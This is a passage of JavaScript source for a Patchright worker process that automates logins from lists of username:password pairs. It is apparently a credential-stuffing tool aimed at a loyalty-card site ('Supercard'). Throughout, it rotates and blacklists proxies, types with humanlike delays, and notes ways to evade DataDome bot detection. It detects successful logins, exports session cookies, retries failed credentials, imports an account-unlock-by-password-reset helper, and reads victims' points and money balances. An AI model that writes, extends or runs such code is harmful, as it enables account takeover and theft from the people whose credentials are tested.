/**
 * ============================================================================
 * PATCHRIGHT WORKER PROCESS - COMPLETE INTEGRATION WITH REFINED CAS DETECTION
 * ============================================================================
 * 
 * Features:  
 * ✅ TGC Cookie detection (PRIMARY - 99% confidence)
 * ✅ CAS Ticket redirect detection (99% confidence)
 * ✅ Confidence-based success filtering (>= 0.85)
 * ✅ False positive elimination (removed navigation-only detection)
 * ✅ Advanced logging with categorization
 * ✅ Character-by-character form filling
 * ✅ Proxy health checks & blacklisting
 * ✅ Error recovery & relaunch mechanisms
 * ✅ FIXED: Screenshot directory creation and path handling
 */

const { chromium } = require('patchright');
const ProxyChain = require('proxy-chain');
const net = require('net');
const fs = require('fs');
const os = require('os');
const path = require('path');

const config = require('./config');
const AdvancedLogger = require('./utils/logger');
const SessionManager = require('./utils/sessionManager');
const CookieExporter = require('./utils/cookieExporter');
const { findAndClickSubmitButton, detectRecaptcha, findAndClickLogoutButton } = require('./utils/formSubmit');
const { submitAndDetectCasFlowOptimized: submitAndDetectCasFlow, AdaptiveDetectionTimeout } = require('./utils/casDetection');
const { mouseMovementBeforeFormFill, mouseMovementDuringFormFill, mouseMovementAfterSubmit } = require('./utils/mouseMovement');
const { unlockAccountViaPasswordReset } = require('./utils/accountUnlock');

// Pre-normalize detection phrases at module load for performance
const INVALID_CREDENTIALS_PHRASE_NORMALIZED = config.detection.invalidCredentialsPhrase
  .replace(/\s+/g, ' ')
  .trim()
  .toLowerCase();
const ACCOUNT_LOCK_PHRASE_NORMALIZED = (config.detection.accountLockPhrase || '')
  .replace(/\s+/g, ' ')
  .trim()
  .toLowerCase();
const SUSPICIOUS_BEHAVIOR_PHRASE_NORMALIZED = config.detection.suspiciousBehaviorPhrase
  .replace(/\s+/g, ' ')
  .trim()
  .toLowerCase();
const CAPTCHA_PHRASE_NORMALIZED = config.detection.captchaPhrase
  .replace(/\s+/g, ' ')
  .trim()
  .toLowerCase();
const BOT_CHECK_PHRASE_NORMALIZED = config.detection.botCheckPhrase
  .replace(/\s+/g, ' ')
  .trim()
  .toLowerCase();

// ============ BATCH IDENTIFICATION ============
const BATCH_NUM = process.env.BATCH_NUM || 'standalone';

// ============ LOGGER INITIALIZATION ============
const logger = new AdvancedLogger({
  logDir: path.join(process.cwd(), 'logs'),
  level: config.logging.logLevel
});

// ============ SESSION MANAGER INITIALIZATION ============
let sessionManager = null;
if (config.session && config.session.enabled) {
  sessionManager = new SessionManager({
    sessionDir: path.join(process.cwd(), config.session.directory),
    maxAge: config.session.maxAge,
    cleanupOnStart: config.session.cleanupOnStart
  });
  logger.info('[WORKER]', 'Session management enabled');
}

// ============ COOKIE EXPORTER INITIALIZATION ============
let cookieExporter = null;
if (config.cookieExport && config.cookieExport.enabled) {
  cookieExporter = new CookieExporter({
    exportDir: path.join(process.cwd(), config.cookieExport.exportDir || 'CookieExports'),
    enabled: true,
    format: config.cookieExport.format || 'sessionComplete'
  });
  logger.info('[WORKER]', 'Cookie export enabled');
}

logger.info('[WORKER]', 'Worker process started');

const sleep = ms => new Promise(r => setTimeout(r, ms));
const rnd = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;

// ============ RETRY QUEUE HELPER ============

/**
 * Send message to controller to add credential to retry queue
 */
function addToRetryQueue(credential, reason) {
  if (process.send && config.retry && config.retry.enabled) {
    try {
      process.send({
        type: 'retry_add',
        credential: {
          username: credential.username,
          password: credential.password
        },
        reason: reason || 'unknown'
      });
      logger.debug('[RETRY]', `Sent retry queue add for ${credential.username}`);
    } catch (error) {
      logger.warn('[RETRY]', `Failed to send retry message: ${error.message}`);
    }
  }
}

// ============ PROGRESSIVE BACKOFF ============

let consecutiveBlocks = 0;

function getBackoffDelay() {
  if (consecutiveBlocks === 0) {
    return rnd(config.form.pauseBetweenCredsMin, config.form.pauseBetweenCredsMax);
  }
  const backoff = Math.min(1000 * Math.pow(2, consecutiveBlocks - 1), 30000);
  const jitter = backoff * 0.25 * (Math.random() * 2 - 1);
  return Math.floor(backoff + jitter);
}

// ============ DIRECTORY INITIALIZATION ============

function ensureDirectories() {
  const dirs = [
    path.join(process.cwd(), 'logs'),
    path.join(process.cwd(), 'logs', 'successful'),
    path.join(process.cwd(), 'logs', 'failed'),
    path.join(process.cwd(), 'logs', 'blocked'),
    path.join(process.cwd(), 'logs', 'captcha'),
    path.join(process.cwd(), 'logs', 'errors')
  ];

  for (const dir of dirs) {
    try {
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
        logger.debug('[INIT]', `Created directory: ${dir}`);
      }
    } catch (e) {
      logger.error('[INIT]', `Failed to create directory ${dir}: ${e && e.message}`);
    }
  }
}

// ✅ FIX: Clean up stale tmp dirs from previous crashed workers
function cleanupStaleTmpDirs() {
  try {
    const tmpDir = os.tmpdir();
    const PREFIX = 'superrmurrer-batch-';
    // Skip directories belonging to the current batch — they may still be in use
    // by other workers running with the same BATCH_NUM
    const currentBatchPrefix = `${PREFIX}${BATCH_NUM}-`;
    const entries = fs.readdirSync(tmpDir);
    const maxAgeMs = 60 * 60 * 1000; // 1 hour
    const now = Date.now();

    for (const entry of entries) {
      if (!entry.startsWith(PREFIX)) continue;
      // Never touch dirs that belong to the current batch
      if (entry.startsWith(currentBatchPrefix)) continue;
      const fullPath = path.join(tmpDir, entry);
      try {
        const stat = fs.statSync(fullPath);
        if (stat.isDirectory() && (now - stat.mtimeMs) > maxAgeMs) {
          fs.rmSync(fullPath, { recursive: true, force: true });
          logger.debug('[INIT]', `Cleaned up stale tmpdir: ${entry}`);
        }
      } catch (e) {
        logger.debug('[INIT]', `Failed to remove stale tmpdir ${entry}: ${e.message}`);
      }
    }
  } catch (e) {
    logger.debug('[INIT]', `Stale tmpdir cleanup error: ${e.message}`);
  }
}

// ============ PROXY MANAGEMENT ============

const blacklist = new Map();
// ✅ FIX: Track blacklist file mtime for stale-reload detection
let lastBlacklistMtime = 0;

function loadBlacklist() {
  try {
    if (!fs.existsSync(config.output.badProxiesFile)) return;
    const lines = fs.readFileSync(config.output.badProxiesFile, 'utf8').split('\n').filter(Boolean);

    // ✅ FIX: Rebuild map from disk on every load so truncated/rotated files
    // don't leave removed proxies permanently blacklisted in memory
    blacklist.clear();
    for (const ln of lines) {
      const parts = ln.split('\t');
      const ts = Date.parse(parts[0]);
      const upstream = parts.length >= 3 ? parts[1] : parts.slice(1).join('\t');
      const reason = parts.length >= 3 ? parts[2] : 'default';

      if (upstream && !isNaN(ts)) {
        // Use reason-specific TTL if available, otherwise use default
        const ttl = config.proxy.blacklistTTLs?.[reason] || config.proxy.blacklistTTL;
        if ((Date.now() - ts) <= ttl) {
          blacklist.set(upstream, { timestamp: ts, ttl, reason });
        }
      }
    }
    logger.debug('[PROXY]', `Loaded ${blacklist.size} blacklisted proxies`);
    // ✅ FIX: Track mtime after successful load
    try {
      lastBlacklistMtime = fs.statSync(config.output.badProxiesFile).mtimeMs;
    } catch (_) {}
  } catch (e) {
    logger.warn('[PROXY]', `Failed to load blacklist: ${e && e.message}`);
  }
}

// ✅ FIX: Refresh blacklist from disk if the file has changed since last load
function refreshBlacklistIfStale() {
  try {
    if (!fs.existsSync(config.output.badProxiesFile)) {
      // ✅ FIX: File deleted — clear in-memory map so removed proxies don't
      // remain blacklisted for the rest of this worker's lifetime
      if (blacklist.size > 0) {
        blacklist.clear();
        lastBlacklistMtime = 0;
        logger.debug('[PROXY]', `Blacklist file removed — in-memory blacklist cleared`);
      }
      return;
    }
    const stat = fs.statSync(config.output.badProxiesFile);
    if (stat.mtimeMs > lastBlacklistMtime) {
      loadBlacklist();
      logger.debug('[PROXY]', `Blacklist refreshed (file changed)`);
    }
  } catch (e) {
    logger.debug('[PROXY]', `Blacklist refresh check failed: ${e.message}`);
  }
}

function isBlacklisted(upstream) {
  const entry = blacklist.get(upstream);
  if (!entry) return false;
  const ttl = typeof entry === 'object' ? entry.ttl : config.proxy.blacklistTTL;
  const timestamp = typeof entry === 'object' ? entry.timestamp : entry;
  if (Date.now() - timestamp > ttl) {
    blacklist.delete(upstream);
    return false;
  }
  return true;
}

function addToBlacklist(upstream, reason = 'default') {
  const ttl = config.proxy.blacklistTTLs?.[reason] || config.proxy.blacklistTTL;
  blacklist.set(upstream, { timestamp: Date.now(), ttl, reason });
  const ts = new Date().toISOString();
  fs.appendFileSync(config.output.badProxiesFile, `${ts}\t${upstream}\t${reason}\n`, 'utf8');
  logger.warn('[PROXY]', `Blacklisted proxy (${reason}, TTL: ${ttl/60000}min): ${upstream}`);
}

function normalizeProxyLine(line) {
  if (!line) return null;
  line = line.trim();

  if (/^(https?|socks5?):\/\//i.test(line)) return line;

  const parts = line.split(':');
  if (parts.length >= 4) {
    const host = parts[0];
    const port = parts[1];
    const user = parts[2];
    const pass = parts.slice(3).join(':');
    return `http://${encodeURIComponent(user)}:${encodeURIComponent(pass)}@${host}:${port}`;
  }
  if (parts.length === 2) {
    return `http://${parts[0]}:${parts[1]}`;
  }
  return null;
}

function extractHostPort(upstream) {
  if (!upstream) return null;
  try {
    if (/^(https?|socks5?):\/\//i.test(upstream)) {
      const u = new URL(upstream);
      const port = u.port ? Number(u.port) : (u.protocol && u.protocol.toLowerCase().includes('socks') ? 1080 : 80);
      return { host: u.hostname, port };
    }
    const parts = upstream.split(':');
    return parts.length >= 2 ? { host: parts[0], port: Number(parts[1]) } : null;
  } catch (_) {
    return null;
  }
}

function checkTcpConnect(host, port, timeout = 3000) {
  return new Promise(resolve => {
    let resolved = false;
    try {
      const socket = net.createConnection({ host, port, timeout }, () => {
        if (!resolved) {
          resolved = true;
          socket.destroy();
          resolve(true);
        }
      });
      socket.on('error', () => {
        if (!resolved) {
          resolved = true;
          try { socket.destroy(); } catch (_) {}
          resolve(false);
        }
      });
      socket.on('timeout', () => {
        if (!resolved) {
          resolved = true;
          try { socket.destroy(); } catch (_) {}
          resolve(false);
        }
      });
    } catch (e) {
      resolve(false);
    }
  });
}

// ============ FORM FILLING ============

function getTypingDelay(char, position, pauseInterval) {
  const base = rnd(80, 160);
  const specialChars = '@._-+!#$%';
  const specialBonus = specialChars.includes(char) ? rnd(40, 120) : 0;
  const firstCharBonus = position === 0 ? rnd(50, 150) : 0;
  // Micro-pause every pauseInterval characters
  const pauseBonus = (position > 0 && position % pauseInterval === 0) ? rnd(0, 200) : 0;
  return base + specialBonus + firstCharBonus + pauseBonus;
}

async function fastFill(page, selector, text, options = {}) {
  try {
    // Clear field using selection + Backspace (no page.evaluate)
    await page.locator(selector).click({ clickCount: 3 }).catch((e) => logger.debug('[FORM]', `Clear click failed: ${e.message}`));
    await page.keyboard.press('Backspace').catch((e) => logger.debug('[FORM]', `Backspace failed: ${e.message}`));

    logger.debug('[FORM]', `Typing into ${selector}`);

    // Type via page.keyboard (element is already focused from the click above).
    // Unlike page.type(selector, char) which re-focuses per character via selector
    // lookup, keyboard.type() sends keys to the currently focused element —
    // matching how a real user types.
    const pauseInterval = rnd(4, 8);
    for (let i = 0; i < text.length; i++) {
      const char = text[i];
      const delay = getTypingDelay(char, i, pauseInterval);
      try {
        await sleep(delay);
        await page.keyboard.type(char);
      } catch (e) {
        logger.debug('[FORM]', `Failed to type char '${char}'`);
      }
    }

    const filledValue = await page.inputValue(selector).catch(() => '');
    if (filledValue === text) {
      logger.debug('[FORM]', `✓ Character-by-character fill successful`);
      return true;
    }

    // If verification fails, the field may have lost focus or a char was dropped.
    // Do NOT fall back to page.fill() — it creates synthetic input events without
    // the keyboard event chain, which DataDome detects.
    logger.warn('[FORM]', `Fill verification failed for ${selector} (got ${filledValue.length}/${text.length} chars)`);
    return false;

  } catch (error) {
    logger.error('[FORM]', `fastFill error: ${error && error.message}`);
    return false;
  }
}

async function fillForm(page, fieldMap) {
  let filledCount = 0;

  for (const [selector, value] of Object.entries(fieldMap)) {
    const success = await fastFill(page, selector, value);
    if (success) filledCount++;
  }

  return {
    success: filledCount === Object.keys(fieldMap).length,
    filled: filledCount,
    total: Object.keys(fieldMap).length
  };
}


function writeFailedLine(username, password, reason, batchNum) {
  try {
    const ts = new Date().toISOString();
    const line = `${username}:${password}\t${ts}\t${reason}\tbatch: ${batchNum}\n`;
    fs.appendFileSync(config.output.failedFile, line, 'utf8');
  } catch (e) {
    logger.warn('[LOG]', `Failed to write failed line: ${e && e.message}`);
  }
}

// ============ COOKIE CONSENT & BALANCE PARSING ============

/**
 * Dismiss cookie consent popup if present
 * @param {Page} page - Playwright page object
 * @returns {Promise<boolean>} - True if popup was dismissed, false otherwise
 */
async function dismissCookiePopup(page) {
  try {
    logger.debug('[COOKIE]', 'Checking for cookie consent popup...');
    
    const selectors = config.account.cookiePopupSelectors || ['#onetrust-accept-btn-handler'];

    // Race all CSS selectors simultaneously — first visible one wins.
    // Any selector that fails to appear within 3000ms resolves to null.
    const racePromises = selectors.map(sel =>
      page.waitForSelector(sel, { timeout: 3000, state: 'visible' })
        .then(el => ({ el, sel }))
        .catch(() => null)
    );

    const winner = await Promise.any(racePromises).catch(() => null);

    if (winner) {
      await winner.el.click();
      logger.success('[COOKIE]', `✅ Cookie popup dismissed using selector: ${winner.sel}`);
      return true;
    }
    
    // Text-based fallback: try common accept-all button texts (case-insensitive)
    const acceptTexts = ['Alle akzeptieren', 'Alles akzeptieren', 'Accept all'];
    for (const text of acceptTexts) {
      try {
        const btn = page.getByText(text, { exact: false });
        if (await btn.isVisible().catch(() => false)) {
          await btn.click();
          logger.success('[COOKIE]', `✅ Cookie popup dismissed using text: "${text}"`);
          return true;
        }
      } catch (e) {
        logger.debug('[COOKIE]', `Text fallback "${text}" not found or not clickable`);
      }
    }
    
    logger.debug('[COOKIE]', 'No cookie popup found');
    return false;
  } catch (error) {
    logger.debug('[COOKIE]', `Cookie dismissal error (non-blocking): ${error?.message}`);
    return false;
  }
}

/**
 * Dismiss newsletter subscription popup (e.g. "Alle Supercard Vorteile direkt im Postfach").
 * This modal uses different selectors from cookie consent popups and appears after login.
 * Non-blocking: if no popup is found, continues silently.
 * @param {Page} page - Playwright page object
 * @returns {Promise<boolean>}
 */
async function dismissNewsletterPopup(page) {
  try {
    logger.debug('[NEWSLETTER]', 'Checking for newsletter subscription popup...');

    const cfg = config.account.newsletterPopupSelectors || {};
    const dismissTexts = cfg.dismissTexts || ['Nein, danke', 'No thanks', 'Nicht jetzt', 'Not now'];
    const closeSelectors = cfg.closeSelectors || [
      'button[aria-label="Close"]',
      'button[aria-label="Schliessen"]',
      'button[aria-label="schliessen"]',
      '.modal-close',
      '[data-dismiss="modal"]',
      'button.close'
    ];

    // Try text-based dismiss buttons first ("Nein, danke", etc.)
    for (const text of dismissTexts) {
      try {
        const btn = page.getByText(text, { exact: false });
        if (await btn.isVisible({ timeout: 1500 }).catch(() => false)) {
          await btn.click();
          logger.debug('[NEWSLETTER]', `✅ Newsletter popup dismissed using text: "${text}"`);
          return true;
        }
      } catch (_) {
        // continue to next option
      }
    }

    // Try generic close/dismiss selectors
    for (const sel of closeSelectors) {
      try {
        const el = await page.waitForSelector(sel, { timeout: 1500, state: 'visible' }).catch(() => null);
        if (el) {
          await el.click();
          logger.debug('[NEWSLETTER]', `✅ Newsletter popup dismissed using selector: ${sel}`);
          return true;
        }
      } catch (_) {
        // continue to next selector
      }
    }

    logger.debug('[NEWSLETTER]', 'No newsletter popup found');
    return false;
  } catch (error) {
    logger.debug('[NEWSLETTER]', `Newsletter dismissal error (non-blocking): ${error?.message}`);
    return false;
  }
}

/**
 * Dismiss Chrome password manager dialogs (e.g. password leak notification).
 * These are browser-chrome UI elements that Playwright cannot interact with via page DOM.
 * Suppression is handled at launch time via --disable-features=PasswordLeakDetection,PasswordCheck
 * and --password-store=basic in browser.args. This function is intentionally a no-op kept as
 * an extension point should a site-level password modal need to be handled in the future.
 * @param {Page} page - Playwright page object
 * @returns {Promise<boolean>}
 */
async function dismissPasswordDialogs(page) { // eslint-disable-line no-unused-vars
  return false;
}

/**
 * Dismiss all blocking dialogs: GDPR/cookie consent, newsletter subscription popup,
 * and Chrome password manager dialogs.
 * @param {Page} page - Playwright page object
 * @returns {Promise<void>}
 */
async function dismissAllBlockingDialogs(page) {
  await dismissCookiePopup(page);
  await dismissNewsletterPopup(page);
  await dismissPasswordDialogs(page);
}


async function parseAccountBalances(page) {
  const result = {
    pointsBalance: 'N/A',
    moneyBalance: 'N/A'
  };
  
  try {
    logger.debug('[BALANCE]', 'Parsing account balances...');
    
    const timeout = config.account.balanceSelectors?.timeout || 3000;
    const pointsSelector = config.account.balanceSelectors?.points || 'span.myPointBalance-value';
    const moneySelector = config.account.balanceSelectors?.money || 'span.myMoneyBalance-value';
    
    // Alternative selectors for balance elements
    const pointsAltSelectors = [
      pointsSelector,
      '[class*="PointBalance"]',
      '[class*="points-balance"]',
      'span[data-testid*="points"]'
    ];
    
    const moneyAltSelectors = [
      moneySelector,
      '[class*="MoneyBalance"]',
      '[class*="money-balance"]',
      'span[data-testid*="money"]'
    ];
    
    // Parse points balance with fallback selectors
    try {
      let pointsElement = null;
      const minTimeout = 500; // Minimum timeout per selector to avoid premature failures
      const timeoutPerSelector = Math.max(minTimeout, timeout / pointsAltSelectors.length);
      
      for (const selector of pointsAltSelectors) {
        pointsElement = await page.waitForSelector(selector, { timeout: timeoutPerSelector, state: 'visible' }).catch(() => null);
        if (pointsElement) break;
      }
      
      if (pointsElement) {
        const pointsText = await pointsElement.textContent().catch(() => null);
        if (pointsText) {
          result.pointsBalance = pointsText.trim();
          logger.debug('[BALANCE]', `Points balance: ${result.pointsBalance}`);
        }
      } else {
        logger.debug('[BALANCE]', `Points balance element not found with any selector`);
      }
    } catch (e) {
      logger.debug('[BALANCE]', `Error parsing points balance: ${e?.message}`);
    }
    
    // Parse money balance with fallback selectors
    try {
      let moneyElement = null;
      const minTimeout = 500; // Minimum timeout per selector to avoid premature failures
      const timeoutPerSelector = Math.max(minTimeout, timeout / moneyAltSelectors.length);
      
      for (const selector of moneyAltSelectors) {
        moneyElement = await page.waitForSelector(selector, { timeout: timeoutPerSelector, state: 'visible' }).catch(() => null);
        if (moneyElement) break;
      }
      
      if (moneyElement) {
        const moneyText = await moneyElement.textContent().catch(() => null);
        if (moneyText) {
          result.moneyBalance = moneyText.trim();
          logger.debug('[BALANCE]', `Money balance: ${result.moneyBalance}`);
        }
      } else {
        logger.debug('[BALANCE]', `Money balance element not found with any selector`);
      }
    } catch (e) {
      logger.debug('[BALANCE]', `Error parsing money balance: ${e?.message}`);
    }
    
    logger.info('[BALANCE]', `Parsed balances - Points: ${result.pointsBalance}, Money: ${result.moneyBalance}`);
    
  } catch (error) {
    logger.warn('[BALANCE]', `Balance parsing error: ${error?.message}`);
  }
  
  return result;
}

// ============ BROWSER MANAGEMENT ============

let globalContext = null;
let globalLocalProxy = null;
let globalUsedSocksDirect = false;
let globalUserDataDir = null;
let isCleaningUp = false;
let shuttingDown = false;

async function forceCleanup(reason) {
  if (isCleaningUp) {
    return;
  }
  isCleaningUp = true;
  
  logger.info('[CLEANUP]', `Cleaning up:  ${reason}`);

  if (globalContext) {
    try {
      try {
        const pages = globalContext.pages();
        for (const page of pages) {
          try {
            if (page && typeof page.removeAllListeners === 'function') {
              page.removeAllListeners();
            }
            if (page && typeof page.close === 'function') {
              await page.close().catch(() => {});
            }
          } catch (_) {}
        }
      } catch (_) {}

      if (globalContext && typeof globalContext.close === 'function') {
        await globalContext.close().catch(() => {});
      }
    } catch (e) {
      logger.warn('[CLEANUP]', `Browser cleanup error: ${e && e.message}`);
    }
    globalContext = null;
  }

  if (globalUserDataDir) {
    try {
      fs.rmSync(globalUserDataDir, { recursive: true, force: true });
    } catch (_) {}
    globalUserDataDir = null;
  }

  if (globalLocalProxy && ! globalUsedSocksDirect) {
    try {
      logger.info('[CLEANUP]', 'Closing anonymized proxy.. .');
      await ProxyChain.closeAnonymizedProxy(globalLocalProxy).catch(() => {});
    } catch (e) {
      logger.warn('[CLEANUP]', `Proxy cleanup error: ${e && e.message}`);
    }
    globalLocalProxy = null;
  }

  isCleaningUp = false;
}

process.on('exit', () => {
  logger.cleanupSync();
  if (globalContext || globalLocalProxy) {
    forceCleanup('process_exit').catch(() => {});
  }
});

process.on('SIGTERM', async () => {
  shuttingDown = true;  // Set flag immediately
  try {
    await forceCleanup('sigterm');
  } finally {
    logger.cleanupSync();
  }
  process.exit(0);
});

process.on('SIGINT', async () => {
  shuttingDown = true;  // Set flag immediately
  try {
    await forceCleanup('sigint');
  } finally {
    logger.cleanupSync();
  }
  process.exit(0);
});

async function launchBrowser(proxyUrl) {
  const args = config.browser.args.map(arg =>
    arg === '--proxy-server={PROXY}' ? `--proxy-server=${proxyUrl}` : arg
  );

  // ✅ FIX 0: Prevent Chrome from attempting session restore after crash (avoids crash-loop)
  // Also ensure anti-detection args are always present regardless of config.browser.args
  const crashRecoveryArgs = [
    '--no-restore-last-session',
    '--disable-session-crashed-bubble',
    '--disable-infobars',
    '--hide-crash-restore-bubble',
    '--password-store=basic',
    '--use-mock-keychain',
    '--disable-save-password-bubble',
    '--no-first-run',
    '--no-default-browser-check',
    '--no-service-autorun',
    '--disable-default-apps',
    '--disable-component-update',
    '--disable-notifications',
    '--disable-popup-blocking',
    '--disable-blink-features=AutomationControlled',
    '--disable-ipc-flooding-protection',
    '--disable-renderer-backgrounding',
    '--disable-backgrounding-occluded-windows',
    '--disable-field-trial-config',
    '--disable-component-extensions-with-background-pages',
    '--disable-plugins-discovery'
  ];
  for (const arg of crashRecoveryArgs) {
    if (!args.includes(arg)) {
      args.push(arg);
    }
  }

  // --disable-web-security is opt-in (default off) because it removes same-origin/CORS
  // protections. Enable via config.browser.allowInsecureWebSecurity = true only when
  // the target site requires it.
  if (config.browser.allowInsecureWebSecurity && !args.includes('--disable-web-security')) {
    args.push('--disable-web-security');
  }

  logger.debug('[BROWSER]', `Launching browser with proxy`);

  const userDataDir = fs.mkdtempSync(path.join(os.tmpdir(), `superrmurrer-batch-${BATCH_NUM}-`));
  globalUserDataDir = userDataDir;
  const contextOptions = {
    channel: config.browser.channel,
    headless: config.browser.headless,
    viewport: null,
    args,
    dumpio: config.browser.dumpio,
    ignoreDefaultArgs: config.browser.ignoreDefaultArgs || ['--enable-automation']
  };

  // Pass locale and timezone to Patchright context for consistent fingerprint
  if (config.browser.locale) {
    contextOptions.locale = config.browser.locale;
  }
  if (config.browser.timezone) {
    contextOptions.timezoneId = config.browser.timezone;
  }

  const context = await chromium.launchPersistentContext(userDataDir, contextOptions);

  globalContext = context;
  logger.info('[BROWSER]', `Browser launched successfully`);

  // Patchright handles navigator.webdriver and automation signal suppression
  // natively at the C++ / browser-patch level.  Manual addInitScript overrides
  // create detectable artifacts (property-descriptor anomalies, prototype-chain
  // modifications) that DataDome fingerprints — so we intentionally do NOT
  // inject any JS-level patches here.

  let page = null;
  let creationMethod = 'unknown';

  // ============================================================
  // STRATEGY 1: REUSE existing default page (eliminates duplicates)
  // ============================================================
  try {
    const pages = context.pages();
    if (pages && pages.length > 0) {
      const candidatePage = pages[0];
      
      // ROBUST VALIDATION: Actually test the page methods work
      try {
        // Test that critical methods exist AND work
        if (typeof candidatePage.url === 'function' &&
            typeof candidatePage.goto === 'function' &&
            typeof candidatePage.context === 'function' &&
            typeof candidatePage.evaluate === 'function') {
          
          // Actually CALL methods to verify they work (not just type check)
          // Note: page.url() is synchronous in Playwright/Patchright — wrap in try-catch
          let testUrl = null;
          try {
            testUrl = candidatePage.url();
          } catch (err) {
            logger.debug('[BROWSER]', `candidatePage.url() failed: ${err.message}`);
          }
          let testCookies = null;
          try {
            testCookies = await candidatePage.context().cookies();
          } catch (err) {
            logger.debug('[BROWSER]', `candidatePage.context().cookies() failed: ${err.message}`);
          }
          
          if (testUrl !== null && testCookies !== null) {
            page = candidatePage;
            creationMethod = 'context.pages()[0] (reused & validated)';
            logger.info('[BROWSER]', `✓ Page reused using: ${creationMethod}`);
          } else {
            logger.warn('[BROWSER]', `Default page failed method tests, will create new page`);
          }
        } else {
          logger.warn('[BROWSER]', `Default page missing required methods`);
        }
      } catch (validationError) {
        logger.warn('[BROWSER]', `Default page validation failed: ${validationError.message}`);
      }
    }
  } catch (e) {
    logger.debug('[BROWSER]', `Could not get existing pages: ${e.message}`);
  }

  // ============================================================
  // STRATEGY 2: Create new page if reuse failed
  // ============================================================
  if (!page) {
    // Close any existing broken pages first
    try {
      const existingPages = context.pages();
      for (const p of existingPages) {
        try {
          await p.close().catch((err) => {
            logger.debug('[BROWSER]', `Failed to close page: ${err.message}`);
          });
          logger.debug('[BROWSER]', `Closed existing broken page`);
        } catch (err) {
          logger.debug('[BROWSER]', `Error closing page: ${err.message}`);
        }
      }
    } catch (_) {}

    // Try context.newPage()
    try {
      page = await context.newPage();
      creationMethod = 'context.newPage()';
      logger.info('[BROWSER]', `✓ Page created using: ${creationMethod}`);
    } catch (e) {
      logger.error('[BROWSER]', `newPage() failed: ${e.message}`);
    }
  }

  // ============================================================
  // FINAL VALIDATION with actual method calls
  // ============================================================
  if (page) {
    try {
      // Verify all critical methods work by actually calling them
      // Note: page.url() is synchronous in Playwright/Patchright
      const finalUrl = page.url();
      const finalCookies = await page.context().cookies();
      logger.debug('[BROWSER]', `Validation: url=${finalUrl}, cookies.length=${finalCookies?.length || 0}`);
      logger.info('[BROWSER]', `✓ Page API validated successfully (${creationMethod})`);
    } catch (validationError) {
      logger.error('[BROWSER]', `Page failed final validation: ${validationError.message}`);
      page = null;
    }
  }

  if (!page) {
    throw new Error('Failed to create or validate page after all strategies');
  }
  
  return { context, page };
}

async function relaunchBrowserWithNewProxy(rawProxies) {
  refreshBlacklistIfStale(); // ✅ FIX: Sync blacklist from disk before proxy selection
  logger.warn('[BROWSER]', 'Relaunching browser with new proxy...');
  logger.debug('[RELAUNCH-DEBUG]', `Starting browser relaunch. Available proxies: ${rawProxies.length}`);
  
  await forceCleanup('relaunch');
  await sleep(500);

  let attempts = 0;
  while (attempts < config.proxy.attemptsBeforeGiveUp) {
    attempts++;
    logger.debug('[RELAUNCH-DEBUG]', `Relaunch attempt ${attempts}/${config.proxy.attemptsBeforeGiveUp}`);
    
    const candidateRaw = rawProxies[rnd(0, rawProxies.length - 1)];
    if (!candidateRaw || isBlacklisted(candidateRaw)) {
      logger.debug('[RELAUNCH-DEBUG]', `Proxy candidate skipped (blacklisted or empty)`);
      continue;
    }

    const normalized = normalizeProxyLine(candidateRaw);
    if (!normalized) {
      addToBlacklist(candidateRaw, 'proxy_auth_failed');
      logger.debug('[RELAUNCH-DEBUG]', `Proxy normalization failed`);
      continue;
    }

    const hp = extractHostPort(normalized);
    if (!hp) {
      addToBlacklist(candidateRaw, 'proxy_auth_failed');
      logger.debug('[RELAUNCH-DEBUG]', `Host/port extraction failed`);
      continue;
    }

    logger.debug('[RELAUNCH-DEBUG]', `Testing TCP connection to ${hp.host}:${hp.port}`);
    const ok = await checkTcpConnect(hp.host, hp.port, config.proxy.tcpTimeout || 3000);
    if (!ok) {
      addToBlacklist(candidateRaw, 'tcp_unreachable');
      logger.debug('[RELAUNCH-DEBUG]', `TCP connection failed`);
      continue;
    }

    let localProxy = null;
    let usedSocksDirect = false;

    try {
      if (/^socks/i.test(normalized)) {
        localProxy = normalized;
        usedSocksDirect = true;
      } else {
        localProxy = await ProxyChain.anonymizeProxy(normalized);
      }
    } catch (e) {
      addToBlacklist(candidateRaw, 'proxy_auth_failed');
      logger.debug('[RELAUNCH-DEBUG]', `Proxy anonymization failed: ${e.message}`);
      continue;
    }

    globalLocalProxy = localProxy;
    globalUsedSocksDirect = usedSocksDirect;

    logger.debug('[RELAUNCH-DEBUG]', `Launching browser with new proxy...`);
    const launchResult = await launchBrowser(localProxy);
    globalContext = launchResult.context;
    logger.info('[BROWSER]', `Relaunched with new proxy successfully`);
    logger.debug('[RELAUNCH-DEBUG]', `Browser relaunch completed successfully`);
    return launchResult;
  }

  logger.error('[RELAUNCH-DEBUG]', `All relaunch attempts exhausted`);
  throw new Error('No valid proxy available');
}

async function navTo(page, url, retries = 1) {
  // Check if we're shutting down
  if (shuttingDown) {
    logger.warn('[NAV]', 'Skipping navigation - worker shutting down');
    return { success: false, error: 'shutting_down' };
  }

  // Check if page is still valid
  try {
    if (page.isClosed && typeof page.isClosed === 'function' && page.isClosed()) {
      logger.warn('[NAV]', 'Page already closed, skipping navigation');
      return { success: false, error: 'page_closed' };
    }
  } catch (e) {
    logger.warn('[NAV]', `Page validity check failed: ${e.message}`);
    return { success: false, error: 'page_invalid' };
  }

  const hostname = new URL(url).hostname;

  for (let attempt = 0; attempt <= retries; attempt++) {
    try {
      logger.debug('[NAV]', `Navigating to ${url} (attempt ${attempt + 1}/${retries + 1})`);

      const response = await page.goto(url, {
        waitUntil: config.navigation.domWaitUntil,
        timeout: config.navigation.timeout
      });

      const currentUrl = typeof page.url === 'function' ? page.url() : (page.url || '');
      
      // ⭐ REFINED: Accept navigation success if response is valid, regardless of URL
      // This handles CAS redirects where the URL might change legitimately
      if (response && (response.ok() || response.status() < 400)) {
        logger.debug('[NAV]', `✓ Navigation successful (status: ${response.status()})`);
        return { success: true, response };
      }
      
      // Also accept if current URL matches the target hostname
      if (currentUrl && currentUrl.includes(hostname)) {
        logger.debug('[NAV]', `✓ Navigation successful (URL matched)`);
        return { success: true, response };
      }

      // Fallback: If we have a valid page with content, consider it successful
      // This handles cases where redirects are legitimate (e.g., CAS flow)
      if (currentUrl && currentUrl.startsWith('http')) {
        try {
          const hasContent = await page.evaluate(() => {
            return document.body && document.body.innerText && document.body.innerText.length > 0;
          }).catch(() => false);
          
          if (hasContent) {
            logger.debug('[NAV]', `✓ Navigation successful (page has content)`);
            return { success: true, response };
          }
        } catch (_) {}
      }

      // Last resort: try reload only on first attempt (unless disabled for traffic savings)
